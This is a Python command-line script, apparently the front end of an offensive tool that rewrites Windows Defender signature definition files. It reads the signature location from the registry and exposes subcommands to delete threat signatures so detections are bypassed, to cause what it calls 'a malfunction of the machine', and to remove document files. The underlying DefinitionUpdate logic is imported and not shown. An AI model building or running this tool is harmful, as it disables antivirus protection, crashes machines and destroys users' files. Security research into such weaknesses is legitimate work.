import re
import os
import winreg
import logging
import argparse

from core.utils import version_banner
from core.utils.logger import init_logger
from core.definition_update import DefinitionUpdate

def get_defualt_definition_update_path() -> str:
    logging.info("Getting Signatures Location ...")
    location = winreg.HKEY_LOCAL_MACHINE
    defender_key = winreg.OpenKeyEx(location, r"SOFTWARE\Microsoft\Windows Defender\Signature Updates")
    signature_location = winreg.QueryValueEx(defender_key, "SignatureLocation")
    
    return signature_location[0]

def handle_delete_command(args, definition_update: DefinitionUpdate):
    if args.id or args.name:
        definition_update.delete_threat(args.id, args.name)
    elif args.match:
        definition_update.delete_match_threat(args.match.encode())
        
    definition_update.export()

def handle_do_dos(args, definition_update: DefinitionUpdate):
    definition_update.do_dos()
    definition_update.export()

def router(args, definition_update: DefinitionUpdate):
    if args.command == 'bypass':
        handle_delete_command(args, definition_update)
    elif args.command == 'do-dos':
        handle_do_dos(args, definition_update)
    elif args.command == 'del-docs':
        definition_update.delete_documents()
        definition_update.export()
    elif args.command == 'test':
        definition_update.mpaspair.delete_test()
        definition_update.export()
    else:
        logging.error(f"Unrecognized command: {args.command}")
        pass

def main():
    init_logger()
    print(version_banner())

    options = argparse.ArgumentParser(usage="%(prog)s command [options]", add_help = True, description = "Windows Defender Update")
    options.add_argument('--output', default='.', help='output folder for the exported vdm files')
    options.add_argument('--def_path', default=get_defualt_definition_update_path(), help='set explicit definition update path')
    subparsers = options.add_subparsers(dest='command', required=True)

    bypass_subparser = subparsers.add_parser('bypass', help='bypass windows defender threats')
    bypass_group = bypass_subparser.add_mutually_exclusive_group()
    bypass_group.add_argument('-match', help="delete all threats that his name containes <name>")
    bypass_group.add_argument('-name', help="delete threat by name")
    bypass_group.add_argument('-id', help="delete threat by his id")

    subparsers.add_parser('do-dos', help='resulting in a malfunction of the machine')
    subparsers.add_parser('del-docs', help='removing document files from the machine')
    subparsers.add_parser('test', help='test')

    args = options.parse_args()

    logging.info(f'Definitions Path: {args.def_path}')
    defination_update_path = args.def_path
    output_path = args.output

    definition_update = DefinitionUpdate(defination_update_path)
    definition_update.set_output_path(output_path)

    router(args, definition_update)


if __name__ == "__main__":
    main()